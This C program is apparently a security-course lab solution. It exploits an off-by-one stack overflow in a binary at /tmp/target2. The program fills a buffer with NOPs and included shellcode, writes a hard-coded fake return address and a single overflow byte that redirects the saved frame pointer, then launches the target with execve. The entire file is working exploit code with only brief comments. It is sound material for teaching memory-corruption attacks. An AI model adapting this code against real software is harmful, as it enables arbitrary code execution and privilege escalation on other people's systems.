#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define BUFFSIZE 242   //  240 buffer + 1 overflow + 1 NULL = 242
int main(void)
{
  char *args[3];
  char *env[1];
   
  char buf[BUFFSIZE];

  memset(buf, 0x90, BUFFSIZE - 1);      // Fill exploit string with NOPs
  memcpy(buf, shellcode, strlen(shellcode));    // Place shellcode at start of exploit string 

  *(unsigned long *)(buf + 236) = 0xbffffc88 ;   // Plaice fake eip at end of exploit strig
  *(unsigned long *)(buf + 240) = 0x7C;     // Point overflow byte to fake eip. 
                                           // eip computed from ebp foo  and  buffer address 

   buf[BUFFSIZE - 1] = 0; // NULL terminate exploit string

  
  args[0] = TARGET; args[1] = buf ; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
